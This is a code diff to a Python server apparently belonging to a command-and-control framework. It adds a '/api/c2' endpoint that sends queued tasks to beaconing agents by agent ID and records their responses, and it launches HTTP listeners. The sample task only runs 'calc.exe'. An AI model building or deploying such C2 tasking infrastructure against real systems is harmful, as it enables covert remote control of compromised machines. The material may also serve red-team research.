@@ -96,7 +96,6 @@ class OculusSvr:
 
       # Kick off listener
       if type == "http":
-         print "1"
          CWD = os.getcwd()
          process = Popen(["python", os.path.join(CWD, "listeners/http.py"), name, type, lport, lhost], stdin=None, stdout=None, stderr=None)
          #stdout, stderr = process.communicate()
@@ -105,8 +104,8 @@ class OculusSvr:
       response = "OK"
       return response
 
-   def SyncTasks(self):
-       taskrequest = {'collection':'TASK','agentid': '1'}
+   def SyncTasks(self, agentid):
+       taskrequest = {'collection':'TASK','agentid': agentid}
 
        TASKLIST = Emergence().Get(taskrequest)
        return TASKLIST
@@ -160,7 +159,19 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       elif self.path == '/api/c2':
           self._set_headers()
           self.data_string = self.rfile.read(int(self.headers['Content-Length']))
-          Emergence().Update(self.data_string)
+
+          # Get agentid
+          jdata = json.loads(self.data_string)
+          # If beacon
+          if jdata["type"] == "b":
+             # Retrieve tasklist
+             TASKLIST = OculusSvr().SyncTasks(jdata["agentid"]) # Probable a bug need to sync to self
+
+             self.wfile.write(TASKLIST)
+          # Else Response
+          elif jdata["type"] == "r":
+              print self.data_string
+              Emergence().Update(self.data_string)
 
       else:
          #print self.path
@@ -180,7 +191,6 @@ class Emergence:
       # Send JSON POST urllib or something
       res = requests.post('http://localhost:29001/api/get', data=apirequest)
       data = res.text
-      print data
       tasklist = json.dumps(data)
       #data = "retinfo"
       return data
@@ -194,6 +204,7 @@ TASKLIST = '''{
 "datetime": "now",
 "cmd": "calc.exe"
 }'''
+
 
 BASECLOCK = datetime.utcnow()
 Handler = ServerHandler
